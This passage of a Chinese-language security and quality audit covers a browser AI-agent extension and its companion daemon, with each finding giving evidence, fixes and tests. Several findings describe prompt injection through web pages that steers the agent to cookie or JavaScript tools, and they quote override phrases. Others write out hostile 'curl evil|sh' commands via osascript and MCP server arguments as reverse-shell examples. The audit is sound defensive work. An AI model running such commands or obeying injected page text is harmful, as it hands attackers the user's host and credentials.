- Why it matters: 唯一承重安全控制。键盘用户按 Tab 找"拒绝"可能落"允许执行"误批准。违 WCAG 2.1 SC 2.1.2/2.4.3。
- Realistic failure scenario: 盲用户敏感页触发 evaluate，弹窗出现，Tab 落"允许执行"，Enter 以为确认"拒绝"——任意 JS 在信任域执行。
- Minimal fix: focus-trap（focus-trap-react）：autoFocus 到安全默认"拒绝"，Escape→decide(false)，role=dialog aria-modal，关闭后焦点还原。
- Better long-term fix: 抽 <Modal> primitive，M18 四 modal 复用。
- Regression test suggestion: Playwright——开弹窗 Tab 5 次断言 activeElement 留内；Escape 断言 deny。
- Estimated effort: 0.5 天。

### Finding: M1 tabUrlCache 页面自发导航时不刷新 → 陈旧 hostname 自动批准
- Severity: Medium
- Confidence: High
- Category: Security
- Status: Confirmed
- Affected area: companion evaluate 自动批准门
- Evidence:
  - File: `companion/src/server.ts:59-73`、`:441-473`
  - Function/Module: `refreshTabUrlCache`、`getCachedTabUrl`、自动批准门 `:239-244`
  - Behavior: cache 仅在 list_tabs/navigate/set_tab_url/create_tab 工具结果后刷新；页面 window.location=/SPA 路由切源不触发（`:453-454` 注释自承残余）。
- Problem: 白名单域的页跳攻击者域后，下一次 evaluate({tabId}) 仍按缓存信任 host 自动批准。
- Why it matters: 注入放大路径——白名单域被用来 pivot 到攻击者域执行任意 JS。
- Realistic failure scenario: 白名单 *.internal.corp 的页跳 attacker.com；下次 evaluate 自动批准按缓存 hr.internal.corp；任意 JS 跑在 attacker.com。
- Minimal fix: 扩展端订阅 chrome.tabs.onUpdated 推 tab.url_updated；companion 把缺失/陈旧条目当"未知→需确认"。
- Better long-term fix: evaluate 确认路径实时 list_tabs round-trip 取活 URL。
- Regression test suggestion: seed cache trusted URL；模拟页面导航（无 tool）；调 evaluate 断言不自动批准。
- Estimated effort: 1–2 小时。

### Finding: M2 Prompt-injection 单层防御 + 命中文本仍原样入 LLM
- Severity: Medium
- Confidence: High
- Category: AI-Safety
- Status: Confirmed
- Affected area: 扩展 page-sanitizer + companion adapter
- Evidence:
  - File: `chrome-extension/src/background/page-sanitizer.ts:65-95`；`companion/src/llm/adapter.ts:472-501/697-703`
  - Function/Module: `sanitizeText`、tool-result 入 messages
  - Behavior: 扩展端仅 ~11 个 EN/CN 字面正则，改写"disregard prior guidance/你的新任务是"即过；即便命中也仅替匹配子串，其余页面文本（含载荷）原样入 LLM。companion 端无输入侧净化；仅输出侧 JAILBREAK_OUTPUT_PATTERNS。字段名 threats_removed 误导。
- Problem: 安全戏台。catches 11 个最笨注入尝试，制造 get_page_text 返回"已净化"假象。
- Why it matters: 注入是浏览器-AI agent 的定义威胁。单层正则无纵深，违 ADR-009 已用于 mermaid 的 defense-in-depth 模式。
- Realistic failure scenario: 用户让 agent 总结博客；博客含隐藏注入；sanitizer 漏；LLM 遵从调 get_cookies/evaluate。
- Minimal fix: companion 加输入侧标记方案（<untrusted>…</untrusted> + system 指令）；重命名字段为 injection_phrase_matches 并告警。
- Better long-term fix: 输入侧 LLM-judge 或结构化隔离不可信内容。
- Regression test suggestion: 注入 get_page_text 结果含"Ignore all previous instructions"；断言 sanitizer 标记/标注后才入 messages。
- Estimated effort: 2–3 小时。

### Finding: M3 osascript_eval 任意宿主 shell 仅全局开关门控
- Severity: Medium
- Confidence: High
- Category: Security
- Status: Confirmed
- Affected area: companion osascript_eval 闸门
- Evidence:
  - File: `companion/src/server.ts:705-771`、`:233-244`
  - Function/Module: `executeCompanionTool` osascript_eval case、确认门
  - Behavior: execFile argv 传参无 shell 注入（好），但执行 Chrome 沙箱外 AppleScript，表达式可对任意 origin 发带 cookie fetch；唯一正控是全局 auto_approve_dangerous（全或无，无 per-domain/per-thread 范围）。
- Problem: 一旦开启，被注入 agent 可 do shell script 跑任意 shell，blast radius 是整个用户账户。
- Why it matters: 为一个无人值守工作流开全局=对所有 thread/tab 的所有 osascript 自动批准。
- Realistic failure scenario: 用户为白名单域开 auto_approve_dangerous 夜间抓取；另一 tab 注入诱导 osascript_eval do shell script "curl evil|sh"；自动批准；宿主 RCE。
- Minimal fix: 加 auto_approve_dangerous_domains 范围，或对含 do shell script|System Events|key code 的表达式即使全局开也二次确认；默认禁用。
- Better long-term fix: 沙箱化 osascript（限制可调 API）。
- Regression test suggestion: auto_approve_dangerous:true + per-thread allowlist，osascript 自 other.example.com 仍需确认。
- Estimated effort: 1–2 小时。

### Finding: M4 analyze_image 用 credentials:include 抓跨域图片字节送 LLM
- Severity: Medium
- Confidence: High
- Category: Privacy
- Status: Confirmed
- Affected area: chrome-extension image-extract + analyze_image
- Evidence:
  - File: `chrome-extension/src/background/image-extract-utils.ts:66-78`；`browser-bridge.ts:533-554`
  - Function/Module: 跨域图片抓取、tool.result 转发
  - Behavior: 401/403 时 fetch(src,{credentials:"include"}) 抓全 body→base64→WS→LLM 上下文。<all_urls> 绕 CORS；对 SSO/内网受保护图片静默带用户 cookie 抓取送第三方 LLM（DeepSeek 默认），用户无感知。
- Problem: 认证/受保护图片内容隐私泄漏到外部 LLM provider；源 origin 也随 url 暴露。
- Why it matters: 合规环境（ regulated）的隐私违规。analyze_image 不在 evaluate 级确认集。
- Realistic failure scenario: LLM 幻觉 analyze_image 于内网 SharePoint SSO 图；SW 带 cookie 抓取；字节送 DeepSeek。
- Minimal fix: 不再 include 重试（接受 authed CDN 不能分析，明确报错）；或对 tainted canvas 走确认并明示"将把 <origin> 认证图片送 <provider>"。
- Better long-term fix: 图片分析默认仅 same-origin 或用户显式拖入的文件。
- Regression test suggestion: mock fetch 401→200；断言第二次不携 credentials:include（修复后）。
- Estimated effort: 0.5 天。

### Finding: M5 Cookie 原样回传，扩展端无 trust 域执行；list_all_cookies 倾倒全浏览器
- Severity: Medium
- Confidence: High
- Category: Privacy
- Status: Confirmed
- Affected area: chrome-extension browser-bridge cookie 工具
- Evidence:
  - File: `chrome-extension/src/background/browser-bridge.ts:926-957`
  - Function/Module: `getCookies`、`listAllCookies`
  - Behavior: getCookies 直返 chrome.cookies.getAll({domain})；listAllCookies getAll({}) 返回所有 cookie（含 httpOnly）。trust 域门是 companion 端，扩展当哑管道。
- Problem: httpOnly cookie 本应对页内 JS 不可读，<all_urls>+cookies 穿透该保证交 LLM/peer。配合 C1 离全账户接管一步。
- Why it matters: 全 credential dump（每登录服务 session token）离泄漏一步之遥。
- Realistic failure scenario: 恶意本地进程（C1）连入发 tool.execute list_all_cookies；扩展返回全 cookie jar。
- Minimal fix: 扩展端也 enforce trusted_domains（纵深防御）；list_all_cookies 要求高危确认或移除；httpOnly cookie 值默认脱敏。
- Better long-term fix: cookie 值永不出扩展；仅哈希或需要时按域逐个确认。
- Regression test suggestion: getCookies({domain:"evil.com"}) 配 trusted_domains:["*.bank.com"]；断言拒绝。
- Estimated effort: 1 天。

### Finding: M6 unhandledRejection handler 记日志但不退出
- Severity: Medium
- Confidence: High
- Category: Stability
- Status: Confirmed
- Affected area: companion 进程级 handler
- Evidence:
  - File: `companion/src/index.ts:442-444`
  - Function/Module: `process.on("unhandledRejection")`
  - Behavior: 仅 writeCrashLog；对比 uncaughtException 调 exit(1)。Node v15+ 默认对未处理 rejection 退出，此 handler 覆盖默认并保活于不确定态。
- Problem: 未处理 rejection 通常留应用不一致态；继续服务掩盖 bug 并引发级联静默失败。
- Why it matters: daemon 应可靠却在未处理 rejection 后继续产出腐败/未定义行为无明确失败信号。
- Realistic failure scenario: chatCreate 流式回路内 rejection 逃出 try/catch；进程继续，thread 卡住，无错误浮现。
- Minimal fix: 退出（对齐 uncaughtException）或显式审计每异步路径确保无 rejection 留共享状态不一致。
- Better long-term fix: 全异步路径错误边界 + 状态恢复。
- Regression test suggestion: 子进程触发未处理 rejection；断言非 0 退出。
- Estimated effort: 30 分钟。

### Finding: M7 Logger 泄 URL/MCP params/错误到盘 + 日志文件 0644
- Severity: Medium
- Confidence: High
- Category: Privacy
- Status: Confirmed
- Affected area: companion logger + 工具日志点
- Evidence:
  - File: `companion/src/logger.ts:25/91`；`companion/src/server.ts:109-119/841`
  - Function/Module: SENSITIVE_KEY_RE、summarizeToolParams、logToolFinish、MCP 确认日志
  - Behavior: SENSITIVE_KEY_RE 漏 url/selector/code/params/result；summarizeToolParams 记 tabId/url/domain/selector（URL 可含量参 token/PII）；MCP 确认日志记 code:全参(≤1200)；appendFileSync 无 mode → 0644。
- Problem: logger 写 JSONL 到 ~/.cmspark-agent/logs/，URL token/MCP params/工具错误回显均明文落盘，与 history 脱敏并行一不脱敏流。
- Why it matters: 读 logs 即得 history 脱敏本应防的会话劫持/code 泄漏载荷。
- Realistic failure scenario: 用户 get_cookies 信任域；cookie 值在 history 脱敏，但工具结果错误消息/summarize 可能泄 cookie 名/MCP 文件路径到日志。
- Minimal fix: logger 复用 history redactForStorage；文件 0o600；扩 SENSITIVE_KEY_RE 含 url/selector/code/params/result。
- Better long-term fix: 结构化日志 + 字段级脱敏策略。
- Regression test suggestion: 记 url:"https://example.com/?token=secret"；断言日志脱敏 token。
- Estimated effort: 2–3 小时。

### Finding: M8 无日志轮转 → 无界磁盘增长
- Severity: Medium
- Confidence: High
- Category: Stability
- Status: Confirmed
- Affected area: companion logger
- Evidence:
  - File: `companion/src/logger.ts:67-91`
  - Function/Module: `getLogFilePath`、`logEvent`
  - Behavior: 每日一 JSONL，appendFileSync 无 cap/轮转/retention。约 0.5–2KB/tool call，重度会话 MB/天→年 GB，永不回收。
- Problem: 用户盘无界增长无清理路径。
- Why it matters: daemon 跑数月 logs/ 填盘 → config/threads 写失败 → 级联。
- Realistic failure scenario: 用户跑 daemon 一年；logs/ 5GB；盘满→companion 不能写 config.json/threads。
- Minimal fix: initDataDir 加 retention 扫除（默认 7/30 天）+ 大小轮转（>N MB rename .1）。
- Better long-term fix: rotating-file-stream + 结构化日志级别动态调。
- Regression test suggestion: 启动 companion 删除超 retention 的旧日志。
- Estimated effort: 1–2 小时。

### Finding: M9 双 SIGTERM handler 竞态 → MCP 子进程孤儿
- Severity: Medium
- Confidence: High
- Category: Stability
- Status: Confirmed
- Affected area: companion shutdown 路径
- Evidence:
  - File: `companion/src/daemon.ts:484-507`；`companion/src/server.ts:1522`
  - Function/Module: `setupGracefulShutdown`、`shutdown`
  - Behavior: daemon.ts 的 handler 同步 cleanup + exit，额外注册于 server.ts 异步 mcpManager.shutdown().finally 之外。daemon.ts 同步 exit 可能先于 server.ts 异步 MCP 关停完成，切断后者→孤儿子进程。
- Problem: 两 shutdown handler 竞态。daemon.ts 先 exit 切断 server.ts 异步 MCP 关停。
- Why it matters: 孤儿 MCP 子进程持文件句柄可能继续跑。
- Realistic failure scenario: daemon 启 MCP server；SIGTERM；ps aux|grep mcp 见孤儿。
- Minimal fix: 合并单一 shutdown 路径；daemon.ts await server shutdown promise。
- Better long-term fix: 统一 lifecycle manager。
- Regression test suggestion: daemon+MCP；SIGTERM；断言无孤儿进程。
- Estimated effort: 1–2 小时。

### Finding: M10 中止的 chatCreate 可留孤儿 tool_result 消息（幂等性）
- Severity: Medium
- Confidence: Medium
- Category: Stability
- Status: Suspected
- Affected area: companion chat 回路 + thread 写
- Evidence:
  - File: `companion/src/message-router.ts:281-288`；`companion/src/llm/adapter.ts:178/311/366/581/717`
  - Function/Module: chat.create abort、chatCreate 循环 addMessage
  - Behavior: 新 chat.create abort 旧 controller，但 abort 信号仅 OpenAI 边界与 executeTool 检查；abort 触发与旧 chatCreate unwind 间仍可能 addMessage 落盘，新 run getMessages() 依时序读到僵尸消息。
- Problem: thread 消息文件 append 式；中止 run 留杂散 assistant/tool_result，新 run 下轮可能见。
- Why it matters: 持久化 thread 消息序损坏。LLM 下轮上下文含僵尸消息。
- Realistic failure scenario: 用户发消息后立即 regenerate；首 run 中途 tool 执行，其 tool_result 写盘晚于二 run 加载历史；二 run 见陈旧 tool_result。
- Minimal fix: 每次 addMessage 前查 controller.signal.aborted 跳过；或 chatCreate 循环内 gate addMessage 于 signal。
- Better long-term fix: 单写者/消息序号。
- Regression test suggestion: chat.create 后立即再 chat.create 同 thread；断言无孤儿 tool_result。
- Estimated effort: 1–2 小时。

### Finding: M11 MCP 子进程 transport.close() 异常时泄漏
- Severity: Medium
- Confidence: Medium
- Category: Stability
- Status: Suspected
- Affected area: companion mcp client
- Evidence:
  - File: `companion/src/mcp/client.ts:188-209/111`；`companion/src/mcp/transport.ts:196-200`
  - Function/Module: `close`、`cleanupTransport`、`extractPid`
  - Behavior: cleanupTransport 的 try/catch 吞错；若 SDK StdioClientTransport.close() 在 subprocess.kill() 前抛，子进程泄漏。extractPid 存在但 client 未用于强制 kill。
- Problem: 不良 MCP 子进程（忽略 SIGTERM）跨 config reload/重启累积为僵尸/泄漏。
- Why it matters: 每 applyConfig diff stop+start server；长 daemon 跑+频繁 config 编辑→泄漏堆积。
- Realistic failure scenario: 用户反复切 MCP server trust_level；每次 stop→close；server 请求中 SDK close 可能不 kill 子进程。
- Minimal fix: cleanupTransport SDK close 后宽限期 process.kill(pid,SIGKILL) 若 pid 仍活。
- Better long-term fix: 进程组 kill + cgroups（平台条件）。
- Regression test suggestion: 启忽略 SIGTERM 的 MCP server；manager.shutdown()；断言无孤儿。
- Estimated effort: 1–2 小时。

### Finding: M12 App.tsx 1104 行 god-file 装 9 个不相关组件
- Severity: Medium
- Confidence: High
- Category: Maintainability
- Status: Confirmed
- Affected area: sidepanel App.tsx
- Evidence:
  - File: `chrome-extension/src/sidepanel/App.tsx:1-1104`
  - Function/Module: App/AppContent/ErrorBoundary/SecurityConfirmationDialog/HighlightedCode/PrivilegeModeIndicator/Header/InputArea/DisconnectedBanner/LogBar
  - Behavior: 单文件定义 9 组件 + ~350 行内联样式。安全弹窗风险逻辑（decide() :144-175、白名单构造、审计写）紧挨手写语法高亮器。
- Problem: 触任一组件强制复审无关代码；安全相关变更埋在 1000 行文件中 PR diff 噪声大。
- Why it matters: 评审者漏看安全相关变更；违 SRP 1.1。
- Realistic failure scenario: 评审"修 input placeholder"PR；diff 也改 SecurityConfirmationDialog.decide() 静默改白名单逻辑；上线未被注意。
- Minimal fix: 拆为各 components/*.tsx，无行为变化。
- Better long-term fix: 组件目录 + Storybook 快照。
- Regression test suggestion: 每拆出组件快照渲染一致。
- Estimated effort: 1 天。

### Finding: M13 WS 连接状态三处重复；重连按钮是安慰剂
- Severity: Medium
- Confidence: High
- Category: Frontend-State
- Status: Confirmed
- Affected area: sidepanel useWebSocket + agentStore + SW
- Evidence:
  - File: `chrome-extension/src/sidepanel/hooks/useWebSocket.ts:583/558/609`；`App.tsx:112-119`
  - Function/Module: getStatus 轮询、connected 派发、DisconnectedBanner.onRetry
  - Behavior: 连接状态在 agentStore/SW 内部/3s 轮询回写三处。SW 快于 3s 重连时 banner 仍显断开最多 3s；onRetry 只 alert() 不触发重连（侧栏不能直驱 SW 的 WS）。
- Problem: 重连按钮是安慰剂。用户点"重新连接"见 alert，面板仍断开至 SW backoff 触发。
- Why it matters: 用户体验差；以为坏了。
- Realistic failure scenario: 用户杀 Companion 重启点重连；3–15s 无反应；以为坏了。
- Minimal fix: banner 发 reconnect.now 消息让 SW 取消 backoff 立即重连；断开时轮询降 1s。
- Better long-term fix: 单一连接状态源 + 订阅。
- Regression test suggestion: SW 测 reconnect.now 取消活动 backoff timer。
- Estimated effort: 0.5 天。

### Finding: M14 useWebSocket 450 行 god-function 内嵌业务逻辑
- Severity: Medium
- Confidence: High
- Category: Maintainability
- Status: Confirmed
- Affected area: sidepanel useWebSocket
- Evidence:
  - File: `chrome-extension/src/sidepanel/hooks/useWebSocket.ts:115-563`
  - Function/Module: `switch(msg.type)`
  - Behavior: 单 switch 30+ case 内嵌 Blob 下载(:458/:479)、vault 摘要(:509)、安全确认构造(:266-284)、quick-action 造线程+发 chat(:373-413)。两处重复下载代码；quick-action 硬编码线程工厂与 ThreadList 漂移。
- Problem: hook 应只翻译 WS→store 派发，却拥有副作用与业务逻辑，全无单测。
- Why it matters: 下载代码不可测；两线程工厂默认值漂移。违 SRP。
- Realistic failure scenario: quick-action 线程与工具栏新建线程 temperature/context_window 不同因两硬编码工厂漂移。
- Minimal fix: 抽 messages/{connection,downloads,security,threads}.ts 纯 handler；hook 变 30 行派发器。
- Better long-term fix: 状态机 + 纯 reducer。
- Regression test suggestion: 单测 handleQuickActionStart(msg) 产预期派发序列。
- Estimated effort: 0.5–1 天。

### Finding: M15 长线程无虚拟化 → 200+ 消息 DOM 卡顿
- Severity: Medium
- Confidence: High
- Category: Performance
- Status: Confirmed
- Affected area: sidepanel ChatView
- Evidence:
  - File: `chrome-extension/src/sidepanel/components/ChatView.tsx:118-128`
  - Function/Module: `messages.map`
  - Behavior: 无 windowing；每 MessageRow marked+DOMPurify 一次（memo 好）但 DOM 节点无界累积。无 react-window/react-virtuoso。320px 侧栏研究型长线程必现。
- Problem: ~300 消息含截图/mermaid，布局 N 节点成本主导；切线程冻 UI 1–2s 挂载全部。
- Why it matters: 侧栏 320px，用户会累积长研究线程。
- Realistic failure scenario: 用户跑"总结整线程"产 150 消息；切线程冻 1–2s。
- Minimal fix: react-virtuoso <Virtuoso followOutput>（兼得自动滚）。
- Better long-term fix: 增量渲染 + 滚动懒解析 markdown。
- Regression test suggestion: 渲 1000 消息断言 querySelectorAll('.markdown-body').length < 30。
- Estimated effort: 0.5 天。

### Finding: M16 流式 chat.token 每 token 重渲染整个 ChatView/Header/BottomBar
- Severity: Medium
- Confidence: Medium
- Category: Performance
- Status: Confirmed
- Affected area: sidepanel 渲染树
- Evidence:
  - File: `chrome-extension/src/sidepanel/hooks/useWebSocket.ts:117-119`；`App.tsx:82`
  - Function/Module: SET_STREAMING 派发、AppContent 消费 state
  - Behavior: 每 token SET_STREAMING → streamingContent 变 → AppContent 重渲染 → Header/ChatView/BottomBar/inline InputArea 全重渲染（仅 MessageRow memo 幸存）。30 token/s → 30 调和/s。StreamingMarkdown 60ms 节流好但在重渲染下游。
- Problem: 每消费 useAgentStore().state 者每 token 重渲染。弱机可见卡顿+耗电。
- Why it matters: 节流在重渲染下游只帮 markdown parse 不帮 React 调和。
- Realistic failure scenario: 弱机流长答案，BottomBar/Skills 抖。
- Minimal fix: Header/BottomBar/InputArea 包 React.memo；或拆 store 让 streamingContent 独立 slice 只 ChatView 消费。
- Better long-term fix: store 切片 + selector 订阅。
- Regression test suggestion: 渲 AppContent mock 30 token/s；React DevTools 断言 Header 渲染 ≤1。
- Estimated effort: 0.5 天。

### Finding: M17 破坏性操作用原生 confirm()/alert() → 阻塞渲染线程
- Severity: Medium
- Confidence: High
- Category: Accessibility
- Status: Confirmed
- Affected area: sidepanel 多组件
- Evidence:
  - File: `ThreadList.tsx:48/70`、`McpPanel.tsx:85`、`BottomBar.tsx:238`、`KnowledgeSubPanel.tsx:61`、`App.tsx:117/715/720/723`
  - Function/Module: 删除/重连确认
  - Behavior: 全用 window.confirm/alert。同步阻塞渲染线程；confirm 开时 onMessage 排队但 requestAnimationFrame 暂停；侧栏原生 confirm/alert 有 Chrome quirk；不可本地化/样式化。
- Problem: 用户开删除确认同时收到流式 token → token 排队；关闭后面板跳。视觉不一致。
- Why it matters: 用户开确认时无关安全确认到可能 45s 超时因看不到原生确认后。
- Realistic failure scenario: 用户开删除线程确认；等待中安全确认到并超时。
- Minimal fix: 用既有 in-app 确认（安全弹窗模式）抽 <ConfirmDialog> primitive。
- Better long-term fix: 统一 modal 系统（含 M18）。
- Regression test suggestion: Playwright 开删除确认；断言安全确认仍渲染其上。
- Estimated effort: 0.5 天。

### Finding: M18 SettingsSlideout/McpServerForm/ThreadList/SlashCommand 同 focus-trap/Escape 缺失
- Severity: Medium
- Confidence: High
- Category: Accessibility
- Status: Confirmed
- Affected area: sidepanel 各 modal
- Evidence:
  - File: `SettingsSlideout.tsx:86`、`McpServerForm.tsx:191`、`ThreadList.tsx:82-144`、`SlashCommandPopover.tsx:113-116`
  - Function/Module: backdrop/panel/modal
  - Behavior: backdrop onClick 关闭但 Tab 焦点漏入底层；无 autoFocus/Esc/焦点还原。SlashCommand 全局 keydown 非 trap。
- Problem: 各 modal a11y 不一致；无还原焦点。
- Why it matters: 违 WCAG 2.4.3；高级用户受挫。
- Realistic failure scenario: 开设置 Tab 过关闭按钮→焦点消失进聊天滚动区→找不到回程。
- Minimal fix: 抽一个 <Modal>/<Slideout> primitive（focus trap+Esc+还原焦点），四者复用。
- Better long-term fix: 统一 overlay 系统 + 焦点管理 context。
- Regression test suggestion: Playwright 每 modal：Tab 循环内；Esc 关；焦点还原触发。
- Estimated effort: 0.5 天。

### Finding: M19 默认模型 deepseek-v4-flash 不存在 → 首次运行 400
- Severity: Medium
- Confidence: High
- Category: Configuration
- Status: Suspected
- Affected area: companion 默认配置
- Evidence:
  - File: `companion/src/config.ts:84`
  - Function/Module: defaultConfig.model_name
  - Behavior: 默认 model_name:"deepseek-v4-flash"。DeepSeek 公开 API 仅 deepseek-chat/deepseek-reasoner，"v4-flash" 非真实 id。
- Problem: 新装有效 key 首条消息 400。TROUBLESHOOTING 未提模型名。
- Why it matters: 糟糕首跑体验；用户以为坏了。
- Realistic failure scenario: 新用户装、设 DEEPSEEK_API_KEY、发 hello → 400 → 弃用。
- Minimal fix: 默认 deepseek-chat；启动时对有 key 做 /v1/models 探测。
- Better long-term fix: 模型存在性启动探针 + 友好错误。
- Regression test suggestion: 测试断言默认模型在 DeepSeek 文档模型列表。
- Estimated effort: 15 分钟。

### Finding: M20 无 LLM 成本/token/并发预算 → 无界花费
- Severity: Medium
- Confidence: High
- Category: Cost
- Status: Confirmed
- Affected area: companion llm adapter + server
- Evidence:
  - File: `companion/src/llm/adapter.ts`（无 semaphore/queue）；`companion/src/config.ts:86`（context_window=1,000,000）；`adapter.ts:229/182/418`
  - Function/Module: chatCreate、context truncation、continuousFailures
  - Behavior: 无 per-thread/per-connection 并发限；server 无 maxClients；context_window 默认 1e6 远超 DeepSeek 实限，截断仅过 ctx*3；无 max_tokens cap；无日/月预算；不记 usage.total_tokens。06-05 审计标的 continuousFailures 成功不重置 bug（:182,418）仍在。
- Problem: 长线程每轮重发全历史；失控 tool loop 可连发数十次 LLM 调用。auto_approve_dangerous 下用户走开回来 4 位数账单。
- Why it matters: 真实花费滥用 + retry storm。
- Realistic failure scenario: 用户开 auto_approve_dangerous 起任务；笔记本睡眠；retry 环 8 小时每几秒一发→千次 LLM 调用。
- Minimal fix: per-thread in-flight LLM cap(1)；日志记 usage；可选 daily_token_budget；成功时重置 continuousFailures。
- Better long-term fix: 预算追踪 + 配额硬停 + 警报。
- Regression test suggestion: 同 thread 两并发 chat.create；断言仅一 LLM 在飞。
- Estimated effort: 1 天。

### Finding: M21 WS 协议边界 any-typed，无 discriminated union
- Severity: Medium
- Confidence: High
- Category: Type-Safety
- Status: Confirmed
- Affected area: companion WS 消息协议
- Evidence:
  - File: `companion/src/server.ts:1037/1186`；companion/src 205 处 any/as any
  - Function/Module: `validateWsMessage(msg:any)`、validators map
  - Behavior: 手写 validator Record<string,(m:any)=>...>。最安全敏感边界（不可信网络输入→tool 分发）零编译期形状强制。message-router 处理 msg.tool_name/thread_id/skill_ids 全 any。
- Problem: 新消息类型/字段未检；validator key 拼错静默落 valid。
- Why it matters: 历史上缺校验=攻击者控 tool params。手写 validator 今正确但脆弱。
- Realistic failure scenario: 新 tool 加；忘加 tool.result 形状；LLM 发畸形参；handler 崩或操作 undefined。
- Minimal fix: 定义 type ClientMessage = {|type:"chat.create";...|}|... discriminated union；用 zod parseClientMessage(raw:unknown)。
- Better long-term fix: 协议代码生成（共享 schema 扩展/companion）。
- Regression test suggestion: 编译期：union 加未处理 type 是类型错。
- Estimated effort: 1–2 天。

### Finding: M22 history.export/mcp.update 在 WS 鉴权破后可被利用（继承 C1）
- Severity: Medium
- Confidence: Medium
- Category: Security
- Status: Suspected
- Affected area: companion history.export + mcp.update
- Evidence:
  - File: `companion/src/server.ts:1119-1120/1394-1429`；`message-router.ts:798-814/1241-1245`
  - Function/Module: validateWsMessage、history.export 确认、mcp.update 浅 merge
  - Behavior: history.export 仅确认门，rogue peer 同 socket 自批；mcp.update 浅 spread 可改 stdio server args 为 ["-c","curl evil|sh"]，缓存 trust_level 不失效。
- Problem: 确认门假设请求方是合法用户。无 WS 鉴权（C1）rogue peer 既请求又批准。mcp.update 可持久化指向攻击者 server，后续 tool 在缓存 trusted 下无提示执行。
- Why it matters: 持久化/放大向量——改一次受信 server 配置，后续静默利用。
- Realistic failure scenario: rogue peer（C1）mcp.update 改 stdio args 注入 reverse shell；下次该 server tool 调用执行。
- Minimal fix: C1 修复即关闭；另对改 command/args/url/headers 的 mcp.update/add 走确认并失效 MCP 确认缓存。
- Better long-term fix: server 配置变更审计日志 + 重确认。
- Regression test suggestion: mcp.update 改 args 触发确认；批准后 getMcpConfirmCache().isApproved 返 false。
- Estimated effort: 继承 C1 + 1 小时。

### Finding: L1 原型污染守卫过宽/不完整
- Severity: Low
- Confidence: Medium
- Category: Security
- Status: Confirmed
- Affected area: companion message-router + config deepMerge
- Evidence:
  - File: `companion/src/message-router.ts:1340-1350`；`config.ts:361`
  - Function/Module: `hasPrototypePollutionKey`、`deepMerge`
  - Behavior: 字符串值检查过宽（拒名为"prototype"的合法 MCP server）；deepMerge 靠 spread 语义"偶然安全"。
- Problem: 过宽值检查拒合法配置；JSON 边界无 Object.create(null) 显式净化。
- Why it matters: defense-by-accident；原型污染若发生可注入 Object.prototype。
- Realistic failure scenario: 合理命名 MCP server "prototype" 被拒（误报）。
- Minimal fix: JSON 边界 Object.create(null)；每层拒 __proto__/constructor/prototype；删过宽值检查。
- Better long-term fix: deepMerge 用显式 sanitizer（sanitizeConfig 已半做，复用）。
- Regression test suggestion: config.set {llm:{__proto__:{polluted:true}}} 不致 ({}).polluted===true；mcp.add 名 prototype 成功。
- Estimated effort: 30 分钟。

### Finding: L2 API key 明文存 chrome.storage.local
- Severity: Low
- Confidence: High
- Category: Privacy
- Status: Confirmed
- Affected area: chrome-extension config 存储
- Evidence:
  - File: `chrome-extension/src/background/index.ts:33-49/67-135`
  - Function/Module: loadExtensionConfig、saveExtensionConfig
  - Behavior: chrome.storage.local.set({extensionConfig}) 存 api_key/vision_api_key。MV3 无更好方案（storage.session 不跨 SW 重启持久）。isMaskedApiKey 仅防覆盖不防落盘。
- Problem: storage.local 非加密落盘；盘访问/debug 会话可读。
- Why it matters: 共享机/取证盘镜像/扩展审核关切。
- Realistic failure scenario: 取证/备份捕获扩展 LevelDB 得 DeepSeek key。
- Minimal fix: MV3 无解；文档威胁模型；若扩展 chat 不需 key（已 defer companion 全局配置 index.ts:337-338）停止存储。
- Better long-term fix: key 仅 companion 侧；扩展经 WS 取能力。
- Regression test suggestion: 配置同步后断言扩展 storage.local 不含明文 key。
- Estimated effort: 0.5 天。

### Finding: L3 markdown a 无 target/rel → 侧栏导航钓鱼
- Severity: Low
- Confidence: Medium
- Category: Security
- Status: Suspected
- Affected area: sidepanel ChatView markdown 渲染
- Evidence:
  - File: `chrome-extension/src/sidepanel/components/ChatView.tsx:467-488/516`
  - Function/Module: DOMPurify 配置、dangerouslySetInnerHTML
  - Behavior: ALLOWED_ATTR 含 href，ALLOWED_TAGS 含 a；无 target/rel；无 click 拦截；经 dangerouslySetInnerHTML 渲于特权侧栏。DOMPurify 默认拦 javascript:/data:（仅导航非脚本）。
- Problem: 点 LLM/authored 链接导航侧栏自身到外部 origin（侧栏是普通 tab）；导航后用户失面板+可能被钓。
- Why it matters: 特权页导航/钓鱼。需用户点。
- Realistic failure scenario: LLM（被注入）发 [click here](phishing.example)；用户点；侧栏导航走。
- Minimal fix: 委托 click 拦截 → chrome.tabs.create({url,active:false})；DOMPurify afterSanitizeAttributes hook 加 target=_blank rel=noopener。
- Better long-term fix: 所有外链强制新标签 + 钓鱼检测。
- Regression test suggestion: 渲 a href；模拟点；断言 location.href 不变 + tabs.create 调用。
- Estimated effort: 0.25 天。

### Finding: L4 死代码 components/InputArea.tsx + ConnectionStatus.tsx
- Severity: Low
- Confidence: High
- Category: Maintainability
- Status: Confirmed
- Affected area: chrome-extension components
- Evidence:
  - File: `chrome-extension/src/sidepanel/components/InputArea.tsx:1-257`、`ConnectionStatus.tsx:1-64`
  - Function/Module: InputArea、ConnectionStatus
  - Behavior: grep 显示 App.tsx:5 未引 InputArea（用内联 :361），ConnectionStatus 零引用。两套 InputArea 逻辑漂移（内联缺拖放）。
- Problem: 未来维护者改错那个；已存在拖放支持因无人知删内联而坏。
- Why it matters: 误导 + 漂移风险。
- Realistic failure scenario: bug 报告"拖放文件无反应"；工程师假设 components/InputArea（有 onDrop）已接线。
- Minimal fix: 删两文件，或完成迁移用 prop-driven 版（兼修 M12）。
- Better long-term fix: 死代码检测 lint 规则。
- Regression test suggestion: 组件测试 <InputArea> Enter 发消息。
- Estimated effort: 1–2 小时。

### Finding: L5 自动滚动与用户争抢
- Severity: Low
- Confidence: High
- Category: Frontend-State
- Status: Confirmed
- Affected area: sidepanel ChatView
- Evidence:
  - File: `chrome-extension/src/sidepanel/components/ChatView.tsx:50-61`
  - Function/Module: useEffect 自动滚
  - Behavior: 每 [messages.length,streamingContent] 变化无件 scrollTop=scrollHeight；无 isNearBottom 守卫。
- Problem: 用户上滚读旧消息时每 token 拽回底。
- Why it matters: 长工具序列用户常需复读早期上下文。
- Realistic failure scenario: LLM 流 50 步计划；用户上滚验步骤 3——每 token 拽回步骤 50。
- Minimal fix: 跟踪 userPinnedToBottom；onScroll 设 pinned=(scrollHeight-scrollTop-clientHeight)<60；仅 pinned 时自动滚。
- Better long-term fix: react-virtuoso followOutput 内置该行为。
- Regression test suggestion: Playwright 流式中上滚 200px；断言 scrollTop 下 token 不变。
- Estimated effort: 1–2 小时。

